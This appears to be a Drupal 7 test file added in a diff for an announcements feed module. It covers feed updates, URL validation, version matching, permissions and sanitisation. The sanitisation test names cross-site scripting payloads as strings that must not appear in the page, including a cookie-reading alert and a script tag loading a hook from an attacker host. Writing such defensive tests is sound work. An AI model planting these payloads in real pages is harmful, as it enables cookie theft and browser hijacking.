@@ -1,0 +1,412 @@
+<?php
+
+/**
+ * @file
+ * Contains tests for the announcements_feed module.
+ */
+
+/**
+ * Tests for validating JSON feed with different JSON URLs.
+ */
+class AnnounceFeedTestValidateJsonFeed extends DrupalWebTestCase {
+
+  /**
+   * A user with permission to access toolbar and access announcements.
+   *
+   * @var object
+   */
+  protected $user;
+
+  /**
+   * A test endpoint which contains the community feeds.
+   *
+   * @var string
+   */
+  protected $responseJson;
+
+  /**
+   * A test endpoint which include the new/updated feeds.
+   *
+   * @var string
+   */
+  protected $updatedJson;
+
+  /**
+   * A test endpoint which displays an empty JSON.
+   *
+   * @var string
+   */
+  protected $emptyJson;
+
+  /**
+   * A test endpoint that will have some feeds removed.
+   *
+   * @var string
+   */
+  protected $removed;
+
+  public static function getInfo() {
+    return array(
+      'name' => 'JSON feeds validation / processing',
+      'description' => 'Testing how the code handles multiple types of JSON feeds.',
+      'group' => 'Announcements',
+    );
+  }
+
+  /**
+   * {@inheritdoc}
+   */
+  public function setUp() {
+    global $base_url;
+    module_load_include('inc', 'announce_feed_test', 'announce_feed_test');
+    parent::setUp('user', 'toolbar', 'announcements_feed', 'announce_feed_test');
+    $this->user = $this->drupalCreateUser(array(
+      'access toolbar',
+      'access announcements',
+    ));
+    $this->drupalLogin($this->user);
+    $this->responseJson = $base_url . '/announcements-feed-json/community-feeds';
+    $this->updatedJson = $base_url . '/announcements-feed-json/updated';
+    $this->emptyJson = $base_url . '/announcements-feed-json/empty';
+    $this->removed = $base_url . '/announcements-feed-json/removed';
+    variable_set('announcements_feed_json_url', $this->responseJson);
+  }
+
+  /**
+   * Testing the feed with Updated and Removed JSON feeds.
+   */
+  public function testAnnounceFeedUpdatedAndRemoved() {
+    $this->drupalLogin($this->user);
+    $this->drupalGet('');
+    $this->clickLink('Announcements');
+    variable_set('announcements_feed_json_url', $this->updatedJson);
+    cache_clear_all('announcements_feed', 'cache', TRUE);
+    $this->drupalGet('admin/announcements_feed');
+    $this->assertText('Only 9 - Drupal 106 is available and this feed is Updated');
+    $this->drupalLogout();
+
+    // Testing the removed JSON feed.
+    $this->drupalLogin($this->user);
+    $this->drupalGet('');
+    $this->clickLink('Announcements');
+    variable_set('announcements_feed_json_url', $this->removed);
+    cache_clear_all('announcements_feed', 'cache', TRUE);
+    $this->drupalGet('admin/announcements_feed');
+    $this->assertNoText('Only 9 - Drupal 106 is available and this feed is Updated');
+
+    $this->drupalLogout();
+  }
+
+  /**
+   * Check the status of the feed with an empty JSON feed.
+   */
+  public function testAnnounceFeedEmpty() {
+    // Change the feed URL to empty JSON file.
+    variable_set('announcements_feed_json_url', $this->emptyJson);
+    cache_clear_all('announcements_feed', 'cache', TRUE);
+    $this->drupalLogin($this->user);
+    // Only no announcements available message should show.
+    $this->clickLink('Announcements');
+    $this->assertText('No announcements available');
+  }
+
+}
+/**
+ * Unit test for validate URL functions.
+ */
+class AnnounceFeedTestValidateUrl extends DrupalUnitTestCase {
+
+  public static function getInfo() {
+    return array(
+      'name' => 'JSON feed URLs validation',
+      'description' => 'Unit test to check the validate URL functions.',
+      'group' => 'Announcements',
+    );
+  }
+
+  /**
+   * {@inheritdoc}
+   */
+  public function setUp() {
+    parent::setUp();
+    module_load_include('inc', 'announcements_feed', 'announcements_feed');
+  }
+
+  /**
+   * Test for validating the announcements_feed_validate_url function.
+   */
+  public function testValidateUrl() {
+    $urls = array(
+      array('https://www.drupal.org', TRUE),
+      array('https://drupal.org', TRUE),
+      array('https://api.drupal.org', TRUE),
+      array('https://a.drupal.org', TRUE),
+      array('https://123.drupal.org', TRUE),
+      array('https://api-new.drupal.org', TRUE),
+      array('https://api_new.drupal.org', TRUE),
+      array('https://api-.drupal.org', TRUE),
+      array('https://www.example.org', FALSE),
+      array('https://example.org', FALSE),
+      array('https://api.example.org/project/announce', FALSE),
+      array('https://-api.drupal.org', FALSE),
+      array('https://a.example.org/project/announce', FALSE),
+      array('https://test.drupaal.com', FALSE),
+      array('https://api.drupal.org.example.com', FALSE),
+      array('https://example.org/drupal.org', FALSE),
+    );
+    foreach ($urls as $url) {
+      $result = announcements_feed_validate_url($url[0]);
+      $this->assertEqual($url[1], $result, 'Returned ' . ($url[1] ? 'TRUE' : 'FALSE'));
+    }
+  }
+}
+
+/**
+ * Unit test for version compatibility functions.
+ */
+class AnnounceFeedTestRelevantVersion extends DrupalUnitTestCase {
+
+  public static function getInfo() {
+    return array(
+      'name' => 'Version-specific logic validation',
+      'description' => 'Unit test to check the version-specific logic.',
+      'group' => 'Announcements',
+    );
+  }
+
+  /**
+   * {@inheritdoc}
+   */
+  public function setUp() {
+    parent::setUp();
+    module_load_include('inc', 'announcements_feed', 'announcements_feed');
+  }
+
+  /**
+   * Test for validating the announcements_feed_is_relevant_item function.
+   */
+  public function testIsRelevantItem() {
+    $version_strings = array(
+      array('^7', TRUE),
+      // TRUE only if Drupal version is exactly 7.0.
+      array('=7.0', FALSE),
+      array('>=7', TRUE),
+      array('^7 || ^8 || ^9', TRUE),
+      array('>=7.52', TRUE),
+      array('^7.1 || ^8 || ^9', TRUE),
+      // TRUE only if Drupal version is exactly 7.9999.
+      array('=7.9999', FALSE),
+      array('^8 || ^9', FALSE),
+      array('>8', FALSE),
+      array('>=8.1', FALSE),
+      array('^8 || ^9 || ^10', FALSE),
+    );
+    foreach ($version_strings as $strings) {
+      $result = announcements_feed_is_relevant_item($strings[0]);
+      $this->assertEqual($strings[1], $result, 'Returned ' . ($strings[1] ? 'TRUE' : 'FALSE'));
+    }
+  }
+}
+
+/**
+ * Test the Announcements module permissions.
+ */
+class AnnounceFeedTestValidatePermissions extends DrupalWebTestCase {
+
+  public static function getInfo() {
+    return array(
+      'name' => 'Permissions validation',
+      'description' => 'Tests the module permissions.',
+      'group' => 'Announcements',
+    );
+  }
+
+  /**
+   * {@inheritdoc}
+   */
+  public function setUp() {
+    global $base_url;
+    module_load_include('inc', 'announce_feed_test', 'announce_feed_test');
+    parent::setUp('user', 'toolbar', 'announcements_feed', 'announce_feed_test');
+    $response_json = $base_url . '/announcements-feed-json/community-feeds';
+    variable_set('announcements_feed_json_url', $response_json);
+  }
+
+  /**
+   * Testing the announcements page with access announcements permission.
+   */
+  public function testAnnounceWithPermission() {
+    // Create a user with proper permission.
+    $account = $this->drupalCreateUser(array(
+      'access toolbar',
+      'access announcements',
+    ));
+    $this->drupalLogin($account);
+    $this->drupalGet('');
+    $this->drupalGet('admin/announcements_feed');
+    $this->assertText('Announcements');
+    $this->drupalLogout();
+  }
+
+  /**
+   * Testing the announcements page without access announcements permission.
+   */
+  public function testAnnounceWithoutPermission() {
+    $account = $this->drupalCreateUser(array('access toolbar'));
+    $this->drupalLogin($account);
+    $this->drupalGet('admin/announcements_feed');
+    $this->assertResponse(403);
+  }
+}
+
+/**
+ * Tests the announcements feed with invalid JSON URLs.
+ */
+class AnnounceFeedTestInvalidJsonTestCase extends DrupalWebTestCase {
+
+  /**
+   * A user with permission to access toolbar and access announcements.
+   *
+   * @var object
+   */
+  protected $user;
+
+  /**
+   * A test endpoint which contains the community feeds.
+   *
+   * @var string
+   */
+  protected $responseJson;
+
+  /**
+   * A test endpoint which does not exist.
+   *
+   * @var string
+   */
+  protected $unknownJson;
+
+  /**
+   * A test endpoint which returns invalid JSON.
+   *
+   * @var string
+   */
+  protected $invalidJson;
+
+  /**
+   * A test endpoint that will have some feeds removed.
+   *
+   * @var string
+   */
+  protected $removed;
+
+  public static function getInfo() {
+    return array(
+      'name' => 'Invalid / unknown JSON feed URL',
+      'description' => 'Testing announcements feed with invalid JSON or non-existing JSON URL.',
+      'group' => 'Announcements',
+    );
+  }
+
+  /**
+   * {@inheritdoc}
+   */
+  public function setUp() {
+    global $base_url;
+    module_load_include('inc', 'announce_feed_test', 'announce_feed_test');
+    parent::setUp('user', 'toolbar', 'announcements_feed', 'announce_feed_test');
+    $this->user = $this->drupalCreateUser(array(
+      'access toolbar',
+      'access announcements',
+    ));
+    $this->drupalLogin($this->user);
+    $this->responseJson = $base_url . '/announcements-feed-json/community-feeds';
+    $this->unknownJson = $base_url . '/announcements-feed-json/unknown';
+    $this->invalidJson = $base_url . '/announcements-feed-json/invalid-feeds';
+    variable_set('announcements_feed_json_url', $this->responseJson);
+  }
+
+  /**
+   * Test the announcements feed with invalid JSON or non-existing JSON URL.
+   */
+  public function testInvalidFeedResponse() {
+    // Test when the JSON URL is not found.
+    $this->drupalLogin($this->user);
+    $this->drupalGet('');
+    $this->clickLink('Announcements');
+    variable_set('announcements_feed_json_url', $this->unknownJson);
+    cache_clear_all('announcements_feed', 'cache', TRUE);
+    $this->drupalGet('admin/announcements_feed');
+    $this->assertText('An error occurred while parsing the announcements feed, check the logs for more information.');
+
+    // Test when the JSON feed is invalid.
+    $this->drupalLogout();
+    $this->drupalLogin($this->user);
+    $this->drupalGet('');
+    $this->clickLink('Announcements');
+    variable_set('announcements_feed_json_url', $this->invalidJson);
+    cache_clear_all('announcements_feed', 'cache', TRUE);
+    $this->drupalGet('admin/announcements_feed');
+    $this->assertText('An error occurred while parsing the announcements feed, check the logs for more information.');
+
+    $this->drupalLogout();
+  }
+}
+
+/**
+ * Tests the announcements feed with malicious content.
+ */
+class AnnounceFeedTestSanitizationTestCase extends DrupalWebTestCase {
+
+  /**
+   * A user with permission to access toolbar and access announcements.
+   *
+   * @var object
+   */
+  protected $user;
+
+  /**
+   * A test endpoint which contains the malicious content.
+   *
+   * @var string
+   */
+  protected $hackedJson;
+
+  public static function getInfo() {
+    return array(
+      'name' => 'Hacked JSON feed URL',
+      'description' => 'Testing announcements feed that contains malicious content.',
+      'group' => 'Announcements',
+    );
+  }
+
+  /**
+   * {@inheritdoc}
+   */
+  public function setUp() {
+    global $base_url;
+    module_load_include('inc', 'announce_feed_test', 'announce_feed_test');
+    parent::setUp('user', 'toolbar', 'announcements_feed', 'announce_feed_test');
+    $this->user = $this->drupalCreateUser(array(
+      'access toolbar',
+      'access announcements',
+    ));
+    $this->drupalLogin($this->user);
+    $this->hackedJson = $base_url . '/announcements-feed-json/hacked';
+    variable_set('announcements_feed_json_url', $this->hackedJson);
+  }
+
+  /**
+   * Test the announcements feed with malicious content.
+   */
+  public function testSanitizedFeedResponse() {
+    $this->drupalLogin($this->user);
+    $this->drupalGet('');
+    $this->clickLink('Announcements');
+    $this->drupalGet('admin/announcements_feed');
+    $this->assertNoRaw("<script>alert('drupal')</script>");
+    $this->assertNoRaw("onerror='alert(123)'");
+    $this->assertNoRaw('alert(document.cookie)');
+    $this->assertNoRaw('<script src=http://attackersite/hook.js></script>');
+    $this->drupalLogout();
+  }
+}
